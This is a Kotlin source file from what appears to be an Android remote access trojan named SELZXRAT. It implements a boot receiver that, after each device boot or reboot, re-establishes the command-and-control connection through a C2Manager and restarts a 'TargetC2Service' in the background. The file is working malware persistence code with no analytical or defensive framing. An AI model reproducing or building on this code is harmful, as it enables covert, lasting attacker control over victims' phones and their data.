package com.selzxrat.v5.services

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.util.Log
import com.selzxrat.v5.C2Manager

class BootReceiver : BroadcastReceiver() {

    companion object {
        private const val TAG = "BootReceiver"
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED || intent.action == Intent.ACTION_REBOOT) {
            Log.d(TAG, "Device booted — starting SELZXRAT services")

            // Restart C2 connection
            C2Manager.sendCommand("self", "device_booted", "")

            // Start foreground service to maintain C2
            val serviceIntent = Intent(context, TargetC2Service::class.java).apply {
                action = "restart"
            }
            context.startService(serviceIntent)
        }
    }
}